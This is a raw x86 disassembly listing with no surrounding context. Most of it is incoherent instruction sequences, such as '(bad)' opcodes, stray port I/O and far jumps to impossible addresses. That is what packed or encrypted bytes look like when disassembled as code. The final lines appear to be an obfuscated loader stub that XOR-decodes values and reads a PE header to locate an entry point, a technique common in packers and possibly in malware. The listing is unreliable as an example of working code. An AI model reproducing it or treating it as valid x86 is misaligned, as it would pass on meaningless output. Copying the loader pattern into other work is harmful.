  418024:	call   0xa9f7:0x1ad5fe29
  41802b:	adc    BYTE PTR [ebp-0x7f],dl
  41802e:	pop    edi
  41802f:	sti    
  418030:	loop   0x417fdd
  418032:	sub    al,0x39
  418034:	push   ss
  418035:	sbb    edx,eax
  418037:	stos   DWORD PTR es:[edi],eax
  418038:	ss pop eax
  41803a:	xor    al,0x3
  41803c:	in     al,0xb5
  41803e:	lods   al,BYTE PTR ds:[esi]
  41803f:	ss loope 0x4180bb
  418042:	(bad)  
  418043:	fdivrp st(4),st
  418045:	pusha  
  418046:	sub    esp,eax
  418048:	aad    0x3b
  41804a:	fwait
  41804b:	imul   edi,edi,0x12
  41804e:	sbb    al,0x4e
  418050:	jmp    0xec3de156
  418055:	stos   BYTE PTR es:[edi],al
  418056:	cmp    al,0x25
  418058:	lods   al,BYTE PTR ds:[esi]
  418059:	push   ds
  41805a:	lahf   
  41805b:	not    dh
  41805d:	xor    al,0xb3
  41805f:	daa    
  418060:	in     eax,dx
  418061:	sbb    DWORD PTR [eax],ebx
  418063:	out    0x6e,al
  418065:	sub    DWORD PTR [esi-0x1afc089d],esp
  41806b:	fwait
  41806c:	loop   0x41805d
  41806e:	sub    DWORD PTR [edi],edx
  418070:	ds jmp 0xbf51f185
  418076:	rcr    DWORD PTR [esp+eiz*4],cl
  418079:	and    DWORD PTR [edi],eax
  41807b:	inc    edx
  41807c:	stos   DWORD PTR es:[edi],eax
  41807d:	and    eax,DWORD PTR [ecx+0x21342dcb]
  418083:	jb     0x4180b8
  418085:	xor    eax,0x93a8754d
  41808a:	rcr    DWORD PTR [di+0x1c26],cl
  41808f:	pop    eax
  418090:	jbe    0x418034
  418092:	sub    eax,0x5aa991ba
  418097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418098:	test   BYTE PTR [eax],dl
  41809a:	sbb    BYTE PTR [edx-0x4b],cl
  41809d:	test   ch,bh
  41809f:	gs (bad) 
  4180a1:	out    dx,eax
  4180a2:	scas   eax,DWORD PTR es:[edi]
  4180a3:	sahf   
  4180a4:	and    BYTE PTR [ebx],0x88
  4180a7:	adc    DWORD PTR [esi],esp
  4180a9:	lock in eax,dx
  4180ab:	jmp    0x4180b3
  4180ad:	jmp    0x418090
  4180af:	xchg   ebx,eax
  4180b0:	mov    esp,0xe2dd0f92
  4180b5:	in     eax,dx
  4180b6:	sub    DWORD PTR [eax+0x53],ebx
  4180b9:	xchg   BYTE PTR [edx],al
  4180bb:	xor    DWORD PTR [eax],edx
  4180bd:	sub    cl,BYTE PTR [esi-0x3b461dc2]
  4180c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c4:	cmp    DWORD PTR [ebx-0x22],ebp
  4180c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180c8:	mov    dl,0xb8
  4180ca:	mov    eax,0x4351602b
  4180cf:	inc    edx
  4180d0:	mov    ah,0x5b
  4180d2:	or     BYTE PTR [ecx+0x4f],al
  4180d5:	mov    al,ds:0xc39d4a94
  4180da:	pushf  
  4180db:	and    ebx,DWORD PTR [ebx]
  4180dd:	xchg   esp,eax
  4180de:	sbb    BYTE PTR [esi-0x5fda9478],dh
  4180e4:	inc    esi
  4180e5:	pop    edx
  4180e6:	sbb    ecx,DWORD PTR [ecx+0x716370b]
  4180ec:	repz sbb bh,BYTE PTR [eax+ebp*1]
  4180f0:	mov    ch,0xeb
  4180f2:	iret   
  4180f3:	jno    0x418163
  4180f5:	loope  0x418091
  4180f7:	retf   0xb698
  4180fa:	out    dx,al
  4180fb:	mov    BYTE PTR [eax],dl
  4180fd:	mov    bh,0x31
  4180ff:	cld    
  418100:	jne    0x4180ea
  418102:	push   0x58
  418104:	mov    dh,0xcf
  418106:	xlat   BYTE PTR ds:[ebx]
  418107:	mov    ah,0xcb
  418109:	cmc    
  41810a:	neg    ecx
  41810c:	aam    0xd1
  41810e:	sbb    ecx,DWORD PTR [edx+0x26ade7c]
  418114:	push   0xb27184d6
  418119:	scas   eax,DWORD PTR es:[edi]
  41811a:	jmp    0x418137
  41811c:	or     esp,ebp
  41811e:	cdq    
  41811f:	jl     0x418183
  418121:	mov    al,0x66
  418123:	xchg   esi,eax
  418124:	xlat   BYTE PTR ds:[ebx]
  418125:	and    al,0xbc
  418127:	push   ebp
  418128:	mov    ds,WORD PTR [ebx]
  41812a:	addr16 xchg ebx,eax
  41812c:	cmp    DWORD PTR fs:[edi+ebx*4+0xa73d062],eax
  418134:	pusha  
  418135:	cwde   
  418136:	add    dh,BYTE PTR [edx]
  418138:	fwait
  418139:	scas   al,BYTE PTR es:[edi]
  41813a:	inc    edx
  41813b:	fisttp DWORD PTR [ebx-0x39ab6fbb]
  418141:	sbb    BYTE PTR [edi],dh
  418143:	adc    DWORD PTR [edx+esi*1-0xe],eax
  418147:	sub    al,0x73
  418149:	mov    al,0xc7
  41814b:	fisub  DWORD PTR [ecx+0x3954f512]
  418151:	sub    al,BYTE PTR [ecx+0x51]
  418154:	(bad)  
  418155:	push   cs
  418156:	ins    BYTE PTR es:[edi],dx
  418157:	in     al,dx
  418158:	xchg   BYTE PTR [ebx+0x7a],bh
  41815b:	dec    eax
  41815c:	fwait
  41815d:	enter  0x1cd8,0x33
  418161:	push   0x3e36c69c
  418166:	nop
  418167:	fst    st(1)
  418169:	out    dx,eax
  41816a:	xchg   ebp,eax
  41816b:	or     al,0x5b
  41816d:	dec    ecx
  41816e:	push   ebp
  41816f:	test   DWORD PTR [ecx+ebp*4],edi
  418172:	cmp    bh,BYTE PTR [ecx-0x186e264b]
  418178:	dec    edi
  418179:	(bad)  
  41817a:	fist   DWORD PTR [edi]
  41817c:	lods   eax,DWORD PTR ds:[esi]
  41817d:	mov    es,WORD PTR [ebx+0x2050e2de]
  418183:	dec    ecx
  418184:	dec    edx
  418185:	mov    ebx,0xcaac95d
  41818a:	adc    DWORD PTR [edx],0x5
  41818d:	test   al,0xc0
  41818f:	sub    BYTE PTR [ebx+0x4eab951c],0x77
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	ins    BYTE PTR es:[edi],dx
  4181b8:	jecxz  0x418146
  4181ba:	and    DWORD PTR [ecx],ebx
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x418216
  4181c4:	or     al,0x2a
  4181c6:	outs   dx,BYTE PTR ds:[esi]
  4181c7:	and    DWORD PTR [ebx+ecx*4-0x1e],edi
  4181cb:	aaa    
  4181cc:	leave  
  4181cd:	mov    eax,ds:0xf72a124d
  4181d2:	mov    dl,0xac
  4181d4:	jge    0x418220
  4181d6:	mov    ebp,0x14247688
  4181db:	fs popf 
  4181dd:	loope  0x418247
  4181df:	call   0x1f7140c9
  4181e4:	jo     0x4181b3
  4181e6:	nop
  4181e7:	adc    al,0x8d
  4181e9:	scas   eax,DWORD PTR es:[edi]
  4181ea:	cmp    al,0xdc
  4181ec:	aas    
  4181ed:	popf   
  4181ee:	sub    eax,0x66eabc14
  4181f3:	(bad)
  4181f6:	gs dec esi
  4181f8:	mov    DWORD PTR [edx],0xf7fc4677
  4181fe:	rol    DWORD PTR [ebx+0x25],1
  418201:	sbb    BYTE PTR [eax+0x45207de4],ah
  418207:	pushf  
  418208:	adc    eax,edi
  41820a:	push   ecx
  41820b:	enter  0x38a5,0xe2
  41820f:	sar    DWORD PTR [ecx],cl
  418211:	push   ebx
  418212:	das    
  418213:	xchg   edi,eax
  418214:	hlt    
  418215:	mov    ebx,0x23402fdb
  41821a:	fs mov dh,0xf1
  41821d:	data16 int 0xf6
  418220:	imul   esp,esp,0x57
  418223:	push   0x4e371ecc
  418228:	cmp    ah,BYTE PTR [esi+ecx*1+0x6e]
  41822c:	mov    ds:0x6e0d4a16,al
  418231:	dec    edx
  418232:	nop
  418233:	ret    0xef43
  418236:	out    0x17,al
  418238:	pusha  
  418239:	fs jmp 0x4181f9
  41823c:	sub    eax,0xb35cecca
  418241:	clc    
  418242:	push   0x563a42ae
  418247:	data16 in al,0x77
  41824a:	pop    ebp
  41824b:	outs   dx,BYTE PTR ds:[esi]
  41824c:	aam    0x65
  41824e:	in     al,dx
  41824f:	mov    DWORD PTR [ebx],edx
  418251:	add    eax,0xbc0b537
  418256:	cmp    al,0x9b
  418258:	add    eax,0x6e3c0912
  41825d:	add    BYTE PTR [eax+0x45051971],dl
  418263:	out    dx,eax
  418264:	lods   al,BYTE PTR ds:[esi]
  418265:	mov    WORD PTR [edi-0x78],gs
  418268:	cmp    al,0x72
  41826a:	es montmul (bad)
  41826c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41826d:	(bad)  
  41826e:	mov    al,ds:0x8e637e0a
  418273:	scas   al,BYTE PTR es:[edi]
  418274:	mov    esi,0x4ce96bce
  418279:	icebp  
  41827a:	xor    ecx,DWORD PTR [esp+edx*8+0x40066209]
  418281:	fsubr  st,st(0)
  418283:	adc    al,0xcc
  418285:	or     dl,ch
  418287:	sbb    eax,0x1363bda5
  41828c:	cdq    
  41828d:	out    dx,eax
  41828e:	jmp    0x4b8b0f3b
  418293:	push   0x7da8d49
  418298:	dec    esi
  418299:	push   ecx
  41829a:	and    DWORD PTR [esi+edx*4+0x1b],ecx
  41829e:	rol    BYTE PTR [edi-0x3360111a],1
  4182a4:	(bad)  
  4182a5:	out    dx,eax
  4182a6:	jae    0x4182e9
  4182a8:	mov    BYTE PTR [edx+0xb],dh
  4182ab:	rol    esp,1
  4182ad:	test   al,0x38
  4182af:	xor    DWORD PTR [edx],0xd1931104
  4182b5:	push   eax
  4182b6:	nop
  4182b7:	pop    esp
  4182b8:	xchg   ecx,eax
  4182b9:	fcom   st(1)
  4182bb:	push   es
  4182bc:	stos   DWORD PTR es:[edi],eax
  4182bd:	xor    eax,0xd77f65d4
  4182c2:	dec    edx
  4182c3:	sub    eax,0x8a943934
  4182c8:	jmp    0xa629:0xaf7e651c
  4182cf:	iret   
  4182d0:	sub    dl,BYTE PTR [esi+eax*8+0x20f9bf03]
  4182d7:	dec    esi
  4182d8:	dec    eax
  4182d9:	and    BYTE PTR [ebx-0x1e7687f3],bh
  4182df:	imul   edx,DWORD PTR [esi-0x39dd3a18],0xe244ecb6
  4182e9:	jge    0x41826c
  4182eb:	push   ebp
  4182ec:	ss fnsetpm(287 only) 
  4182ef:	xor    eax,0x9ccd5a70
  4182f4:	add    al,0xf
  4182f6:	cli    
  4182f7:	sub    eax,esp
  4182f9:	daa    
  4182fa:	(bad)  
  4182fb:	ja     0x4182d4
  4182fd:	out    0x9b,al
  4182ff:	push   edi
  418300:	pop    esi
  418301:	push   eax
  418302:	int    0x31
  418304:	xchg   DWORD PTR [ebx+0x13],eax
  418307:	xor    bh,al
  418309:	das    
  41830a:	inc    esp
  41830b:	dec    esp
  41830c:	mov    ch,0x7d
  41830e:	std    
  41830f:	sub    ebp,edx
  418311:	fbstp  TBYTE PTR [edi-0x6]
  418314:	fild   QWORD PTR [esi+0x2]
  418317:	data16 sub BYTE PTR [ebx+0x6b9e53],0xb2
  41831f:	(bad)  
  418320:	(bad)  
  418321:	xlat   BYTE PTR ds:[ebx]
  418322:	pop    ss
  418323:	or     al,dl
  418325:	cwde   
  418326:	scas   al,BYTE PTR es:[edi]
  418327:	je     0x41833c
  418329:	mov    ds:0x71a4b09d,eax
  41832e:	repz rol edi,0x9
  418332:	fist   DWORD PTR [esi-0x775e04a3]
  418338:	dec    edi
  418339:	sub    BYTE PTR [edi-0x41bab87e],bl
  41833f:	adc    eax,0x14cff451
  418344:	data16 adc BYTE PTR cs:[eax],dh
  418348:	shr    bl,cl
  41834a:	sbb    bl,cl
  41834c:	fwait
  41834d:	popa   
  41834e:	icebp  
  41834f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418350:	dec    edi
  418351:	ret    0x4655
  418354:	sti    
  418355:	add    al,al
  418357:	adc    al,0x9d
  418359:	add    eax,0x1975749e
  41835e:	mov    ebx,DWORD PTR [ebx+0x48]
  418361:	cmp    al,0x2c
  418363:	sahf   
  418364:	sub    BYTE PTR [edi-0x65],dh
  418367:	loope  0x4182ff
  418369:	cmp    eax,0xf29163c7
  41836e:	inc    ebx
  41836f:	cmp    al,0xd9
  418371:	mov    ebp,0x2bf6c53c
  418376:	rcl    cl,1
  418378:	ja     0x418374
  41837a:	push   0x41
  41837c:	test   BYTE PTR [edi+0x6a],bl
  41837f:	adc    eax,ecx
  418381:	(bad)  
  418382:	jmp    0x4b48656d
  418387:	fwait
  418388:	jne    0x4183c8
  41838a:	in     al,dx
  41838b:	adc    eax,0x33914961
  418390:	xchg   edi,eax
  418391:	pop    edi
  418392:	enter  0x2ca,0x4d
  418396:	lods   eax,DWORD PTR ds:[esi]
  418397:	pop    ds
  418398:	data16 add bh,al
  41839b:	xchg   DWORD PTR [ecx],eax
  41839d:	adc    DWORD PTR [ebx],ebp
  41839f:	jae    0x4183c1
  4183a1:	cld    
  4183a2:	retf   
  4183a3:	js     0x418408
  4183a5:	inc    esp
  4183a6:	cmp    BYTE PTR [ecx],bl
  4183a8:	jbe    0x418368
  4183aa:	mov    edx,0xf58031c
  4183af:	test   eax,0x1d785cf0
  4183b4:	pop    edi
  4183b5:	or     BYTE PTR [ebp+0x68],0x70
  4183b9:	leave  
  4183ba:	lock sbb ebx,eax
  4183bd:	std    
  4183be:	mov    bl,0xf8
  4183c0:	inc    edx
  4183c1:	sbb    cl,BYTE PTR [edi+edx*8+0x1b8d5ca]
  4183c8:	jl     0x4183da
  4183ca:	and    eax,0xcdfd515a
  4183cf:	inc    edi
  4183d0:	out    0x4c,al
  4183d2:	sub    al,0x77
  4183d4:	mov    edi,0x22bc43cb
  4183d9:	jge    0x4183ba
  4183db:	inc    ebp
  4183dc:	js     0x418412
  4183de:	das    
  4183df:	pop    edi
  4183e0:	cmp    al,0x78
  4183e2:	cmp    al,bl
  4183e4:	loope  0x4183ef
  4183e6:	pop    ds
  4183e7:	xor    eax,0x698dd9e
  4183ec:	jl     0x41837d
  4183ee:	das    
  4183ef:	push   eax
  4183f0:	cmp    BYTE PTR [ecx],al
  4183f2:	mov    eax,0x24a44f43
  4183f7:	call   0x122b624e
  4183fc:	push   ebx
  4183fd:	fst    QWORD PTR [esi]
  4183ff:	xor    esi,DWORD PTR [eax-0x6eab5bb]
  418405:	dec    esp
  418406:	sbb    al,BYTE PTR [edi+0x60]
  418409:	ja     0x418444
  41840b:	imul   esi,DWORD PTR [ebp-0x41],0x9d0adcc6
  418412:	out    dx,al
  418413:	leave  
  418414:	sbb    bh,BYTE PTR [edi+0x19]
  418417:	int    0xe2
  418419:	dec    ecx
  41841a:	mov    edi,0xafc2ad39
  41841f:	add    eax,0x4efbb26f
  418424:	pusha  
  418425:	(bad)  
  418426:	jb     0x41845d
  418428:	xchg   edi,eax
  418429:	rcl    BYTE PTR [edi],cl
  41842b:	in     eax,dx
  41842c:	pop    ebp
  41842d:	mov    ds:0x2082823a,eax
  418432:	add    ah,dl
  418434:	add    al,0xec
  418436:	test   BYTE PTR [ebx-0x4db20315],ch
  41843c:	xchg   BYTE PTR [ebx+ebx*8+0x21],bl
  418440:	push   eax
  418441:	es or  al,0x74
  418444:	outs   dx,DWORD PTR ds:[esi]
  418445:	fbstp  TBYTE PTR [eax]
  418447:	ja     0x418410
  418449:	fild   DWORD PTR [edi]
  41844b:	jns    0x4183f9
  41844d:	jmp    0xc104:0x84e6a2e
  418454:	dec    esi
  418455:	les    eax,FWORD PTR [ebx+0x1d]
  418458:	(bad)  
  41845a:	aad    0xda
  41845c:	pop    edi
  41845d:	les    ebp,FWORD PTR [ebx]
  41845f:	jmp    0x244aa877
  418464:	pusha  
  418465:	add    edx,0xffffffa4
  418468:	sub    edi,DWORD PTR [ebx+ebp*2+0x1a]
  41846c:	xor    ch,BYTE PTR [edx+0x5c4bb1a3]
  418472:	pop    edi
  418473:	dec    eax
  418474:	xor    ah,BYTE PTR [ebp-0x6b1beaf6]
  41847a:	push   es
  41847b:	call   0x57be4560
  418480:	fcom   QWORD PTR [edx-0x65c75dbb]
  418486:	xor    BYTE PTR [ebx],cl
  418488:	or     eax,0xd4d7be30
  41848d:	fmul   DWORD PTR [edi-0x14]
  418490:	push   ecx
  418491:	sbb    BYTE PTR [edx+0x31],al
  418494:	les    edx,FWORD PTR [esi-0x55313d05]
  41849a:	add    BYTE PTR [ebx],cl
  41849c:	cmp    BYTE PTR [esi],bl
  41849e:	js     0x4184c2
  4184a0:	es sbb eax,0xd67b89c6
  4184a6:	jo     0x418447
  4184a8:	lahf   
  4184a9:	jns    0x4184b9
  4184ab:	and    al,0x9c
  4184ad:	mov    DWORD PTR [esi],0xaec1754
  4184b3:	pop    esp
  4184b4:	mov    ecx,0x61625280
  4184b9:	outs   dx,DWORD PTR ds:[esi]
  4184ba:	adc    BYTE PTR [edi-0x6a],ch
  4184bd:	aad    0x4d
  4184bf:	out    0x81,eax
  4184c1:	stc    
  4184c2:	sub    BYTE PTR [ebp-0x7af00764],al
  4184c8:	inc    esi
  4184c9:	stc    
  4184ca:	(bad)  
  4184cb:	(bad)  
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0xbfec6d48
  4184e3:	dec    edi
  4184e4:	pusha  
  4184e5:	mov    ss,WORD PTR [ecx+edi*1]
  4184e8:	jg     0x418562
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	in     al,0x86
  4184f0:	pop    esp
  4184f1:	xchg   ebx,eax
  4184f2:	dec    esi
  4184f3:	dec    DWORD PTR [eax+0x1c424ab1]
  4184f9:	mov    esp,0x4d588382
  4184fe:	mov    eax,ds:0x711c54f4
  418503:	retf   
  418504:	dec    ecx
  418505:	pop    edx
  418506:	std    
  418507:	sub    eax,0x641acc23
  41850d:	xlat   BYTE PTR ds:[ebx]
  41850e:	outs   dx,BYTE PTR ds:[esi]
  41850f:	xchg   DWORD PTR [ebx+0x53],eax
  418512:	adc    DWORD PTR [bp+di+0x454a],eax
  418517:	aad    0xaa
  418519:	rcr    BYTE PTR [eax-0x5ff2f98e],0xc1
  418520:	fldenv [eax+ecx*8]
  418523:	mov    ah,BYTE PTR [ebx-0x68b71d94]
  418529:	cwde   
  41852a:	fistp  QWORD PTR [eax+edi*8]
  41852d:	dec    esp
  41852e:	add    eax,0x63473af
  418533:	clc    
  418534:	loop   0x418506
  418536:	inc    esi
  418537:	data16 add ah,cl
  41853a:	pop    ecx
  41853b:	dec    ebx
  41853c:	sbb    bl,bh
  41853e:	adc    al,BYTE PTR [edx-0x4ee1eaed]
  418544:	mov    ebx,0xdebe436d
  418549:	loopne 0x4185c7
  41854b:	ficomp WORD PTR [edx-0x72413d07]
  418551:	scas   eax,DWORD PTR es:[edi]
  418552:	loopne 0x418583
  418554:	ins    DWORD PTR es:[edi],dx
  418555:	in     al,0x76
  418557:	push   edx
  418558:	inc    esi
  418559:	fs mov bh,0xa9
  41855c:	push   0x11bac2bc
  418561:	adc    DWORD PTR [ebx+0x23],ecx
  418564:	dec    esi
  418565:	add    al,0x70
  418567:	lods   al,BYTE PTR ds:[esi]
  418568:	std    
  418569:	outs   dx,BYTE PTR ds:[esi]
  41856a:	nop
  41856b:	mov    ds:0x2bd5751,al
  418570:	leave  
  418571:	inc    edi
  418572:	(bad)  
  418573:	cwde   
  418574:	aam    0x6f
  418576:	pop    ebx
  418577:	xor    BYTE PTR [esi+0x715a3c19],ch
  41857d:	clc    
  41857e:	in     eax,0x7c
  418580:	scas   eax,DWORD PTR es:[edi]
  418581:	sbb    eax,0xdb674900
  418586:	jo     0x41856c
  418588:	retf   0x259b
  41858b:	enter  0xf291,0xb0
  41858f:	pop    ss
  418590:	jmp    0x418533
  418592:	getsec 
  418594:	and    ebx,DWORD PTR [eax+0x35]
  418597:	fwait
  418598:	mov    edx,0x3779e48e
  41859d:	arpl   WORD PTR [edi+0x44],dx
  4185a0:	sub    edx,esp
  4185a2:	jmp    0x6175:0xea684a37
  4185a9:	adc    DWORD PTR [eax-0x58],0x5c43e54d
  4185b0:	push   ds
  4185b1:	icebp  
  4185b2:	scas   eax,DWORD PTR es:[edi]
  4185b3:	xchg   esi,eax
  4185b4:	adc    al,0xf1
  4185b6:	(bad)
  4185ba:	dec    ebx
  4185bb:	fistp  DWORD PTR [edi+edi*4+0x5ce11cb5]
  4185c2:	push   es
  4185c3:	je     0x4185b0
  4185c5:	fistp  WORD PTR [edx-0x2d7f19ac]
  4185cb:	addr16 push ebp
  4185cd:	lds    esi,FWORD PTR [eax]
  4185cf:	sti    
  4185d0:	add    BYTE PTR [ebx],dh
  4185d2:	inc    ecx
  4185d3:	xor    DWORD PTR [esp+eiz*8-0x7a13fe0b],0x15
  4185db:	xchg   edi,eax
  4185dc:	inc    esi
  4185dd:	(bad)  
  4185de:	mov    ecx,0x2b618dbc
  4185e3:	jl     0x4185fc
  4185e5:	fsub   st(5),st
  4185e7:	add    ch,BYTE PTR [edx]
  4185e9:	xor    cl,BYTE PTR [ebp+0x609e9289]
  4185ef:	dec    esp
  4185f0:	and    eax,0x3020c623
  4185f5:	das    
  4185f6:	shl    DWORD PTR [edx],0x3e
  4185f9:	ret    0xbe91
  4185fc:	adc    eax,0xf5399b4b
  418601:	imul   eax,DWORD PTR [edi+eiz*8+0x70817e57],0xffffffd1
  418609:	xchg   edx,eax
  41860a:	xchg   DWORD PTR [eax-0x3dd3d84f],esi
  418610:	rcr    DWORD PTR [ecx+0x64],0x43
  418614:	mov    ch,0xbe
  418616:	mov    WORD PTR [edx+0x15188e7f],cs
  41861c:	nop
  41861d:	jno    0x4185ff
  41861f:	push   0xffffffb7
  418621:	out    dx,eax
  418622:	mov    al,0x70
  418624:	pop    esp
  418625:	cmp    dl,BYTE PTR [edx]
  418627:	push   0x14bff5e5
  41862c:	int    0xf4
  41862e:	push   eax
  41862f:	mov    WORD PTR [eax],gs
  418631:	adc    edi,ebx
  418633:	xchg   esp,eax
  418634:	cmc    
  418635:	sub    eax,0xa08af1ed
  41863a:	les    esp,FWORD PTR [esi-0x5a]
  41863d:	aad    0x60
  41863f:	mov    esi,0x7252c433
  418644:	push   ds
  418645:	cmc    
  418646:	and    eax,0x780059aa
  41864b:	inc    edx
  41864c:	push   eax
  41864d:	hlt    
  41864e:	daa    
  41864f:	test   al,0x71
  418651:	sub    DWORD PTR [esi+eiz*4-0x73],ebx
  418655:	push   ebx
  418656:	cmp    eax,0xcc5a9dfa
  41865b:	ins    BYTE PTR es:[edi],dx
  41865c:	dec    ecx
  41865d:	xor    BYTE PTR [ecx+0x2b150c79],bl
  418663:	pop    ebx
  418664:	pop    edi
  418665:	in     eax,0x15
  418667:	mov    cl,0x7e
  418669:	or     BYTE PTR [ebp-0x19b4ccde],dh
  41866f:	pop    es
  418670:	fs dec esp
  418672:	imul   dl
  418674:	push   esi
  418675:	pop    ebp
  418676:	push   edi
  418677:	adc    al,0x36
  418679:	rcr    ch,cl
  41867b:	dec    edx
  41867c:	xchg   esi,eax
  41867d:	retf   0xe76a
  418680:	adc    eax,esi
  418682:	pop    ss
  418683:	jno    0x418667
  418685:	sbb    ecx,ecx
  418687:	sti    
  418688:	scas   eax,DWORD PTR es:[edi]
  418689:	shr    dh,cl
  41868b:	ins    DWORD PTR es:[edi],dx
  41868c:	cli    
  41868d:	push   es
  41868e:	es push esp
  418690:	cmc    
  418691:	pusha  
  418692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418693:	lea    ebx,[ecx-0x5505229d]
  418699:	jmp    0x41866a
  41869b:	xchg   DWORD PTR [eax],edi
  41869d:	out    0xcb,eax
  41869f:	mov    ds:0x5e8a3f41,eax
  4186a4:	test   BYTE PTR [eax+0x5d94a902],bh
  4186aa:	push   ss
  4186ab:	push   eax
  4186ac:	xchg   edx,eax
  4186ad:	or     edx,esi
  4186af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b0:	dec    BYTE PTR [ebx]
  4186b2:	push   ebx
  4186b3:	push   0x4f291b3c
  4186b8:	je     0x418696
  4186ba:	sbb    ch,BYTE PTR [ecx-0x4f73f28b]
  4186c0:	push   edi
  4186c1:	rol    dl,1
  4186c3:	jle    0x418711
  4186c5:	shl    DWORD PTR [edx-0x1aed934],0xd4
  4186cc:	pop    eax
  4186cd:	int3   
  4186ce:	cmc    
  4186cf:	pushf  
  4186d0:	mov    ebx,0x16050006
  4186d5:	jg     0x41866f
  4186d7:	and    ah,BYTE PTR [esi+ecx*2-0x1496d205]
  4186de:	lods   al,BYTE PTR ds:[esi]
  4186df:	xor    DWORD PTR [eax+0x48],eax
  4186e2:	retw   
  4186e4:	or     esp,ecx
  4186e6:	sbb    al,0xd6
  4186e8:	aas    
  4186e9:	into   
  4186ea:	jmp    0xad74:0x28ec504a
  4186f1:	push   ds
  4186f2:	adc    al,0x14
  4186f4:	push   ebx
  4186f5:	xlat   BYTE PTR ds:[ebx]
  4186f6:	or     ebp,DWORD PTR ss:[esi-0x52]
  4186fa:	push   cs
  4186fb:	push   ecx
  4186fc:	pop    ds
  4186fd:	sbb    esi,esp
  4186ff:	mov    dl,0xf0
  418701:	(bad)  
  418702:	rcl    esp,1
  418704:	cmp    esi,ecx
  418706:	mov    ebp,0xa69a7d43
  41870b:	or     eax,0xf63d74e6
  418710:	es mov ecx,0xc53a7f9a
  418716:	dec    BYTE PTR [eax]
  418718:	mov    dl,0x43
  41871a:	xlat   BYTE PTR ds:[ebx]
  41871b:	dec    esi
  41871c:	xor    BYTE PTR [esp+ebp*2-0x3c3e9c34],0x95
  418724:	jno    0x41874e
  418726:	enter  0xe471,0xcf
  41872a:	cdq    
  41872b:	sbb    ebx,ecx
  41872d:	ret    0x8900
  418730:	xchg   edx,eax
  418731:	test   BYTE PTR [esp+ebx*4+0x55],bl
  418735:	lea    esi,ds:[esp+esi*4]
  418739:	in     al,0x8f
  41873b:	test   ecx,esi
  41873d:	lods   eax,DWORD PTR ds:[esi]
  41873e:	ins    DWORD PTR es:[edi],dx
  41873f:	sahf   
  418740:	popf   
  418741:	stc    
  418742:	fdivr  QWORD PTR ds:0xac922fd2
  418748:	loopne 0x418767
  41874a:	aad    0x8a
  41874c:	stc    
  41874d:	ins    BYTE PTR es:[edi],dx
  41874e:	push   0x54
  418750:	add    bl,BYTE PTR [eax+0x22618e2e]
  418756:	sbb    DWORD PTR [ebp+ecx*4-0x17],ecx
  41875a:	inc    edi
  41875b:	dec    esi
  41875c:	pop    ebp
  41875d:	dec    esi
  41875e:	iret   
  41875f:	push   esi
  418760:	sub    DWORD PTR [ebp-0x721e3539],esi
  418766:	xchg   esp,eax
  418767:	daa    
  418768:	jo     0x4186f2
  41876a:	jmp    0x4187b3
  41876c:	xlat   BYTE PTR ds:[ebx]
  41876d:	pop    esp
  41876e:	lea    eax,[esi+ebx*2+0x1f]
  418772:	std    
  418773:	cmp    ch,al
  418775:	popa   
  418776:	jle    0x41875a
  418778:	enter  0x6714,0x85
  41877c:	mov    ebx,0x5b995f6c
  418781:	icebp  
  418782:	mov    esi,0x2ed27bf3
  418787:	jl     0x41872f
  418789:	leave  
  41878a:	inc    ebp
  41878b:	pusha  
  41878c:	xor    edx,ebp
  41878e:	imul   ebx,edx,0xfffffff8
  418791:	push   edx
  418792:	pushf  
  418793:	sar    DWORD PTR [edi-0x54],cl
  418796:	mov    al,ds:0x2787d6f1
  41879b:	or     BYTE PTR [ecx-0x2d],dl
  41879e:	dec    eax
  41879f:	in     al,dx
  4187a0:	(bad)  
  4187a1:	jg     0x4187d6
  4187a3:	push   es
  4187a4:	fs jne 0x4187a2
  4187a7:	into   
  4187a8:	loope  0x41877c
  4187aa:	and    dh,0xa9
  4187ad:	das    
  4187ae:	test   BYTE PTR cs:[ebx+0x37212eb6],ah
  4187b5:	loopne 0x4187ad
  4187b7:	ds mov ebx,0x479e1516
  4187be:	adc    edx,edi
  4187c0:	test   eax,0x1fbadaf3
  4187c5:	jecxz  0x4187b4
  4187c7:	or     eax,0x20ceefd9
  4187cc:	xchg   bh,ah
  4187ce:	push   ecx
  4187cf:	mov    cl,0x7b
  4187d1:	fnstsw WORD PTR [ebx+0x51]
  4187d4:	sub    BYTE PTR [esi+0xb],bh
  4187d7:	mov    dl,0x55
  4187d9:	mov    ecx,0xb0a92619
  4187de:	xchg   esp,eax
  4187df:	rol    DWORD PTR [ecx+0x3b],0x36
  4187e3:	add    eax,0xd0840c0d
  4187e8:	in     eax,dx
  4187e9:	pushf  
  4187ea:	inc    edx
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
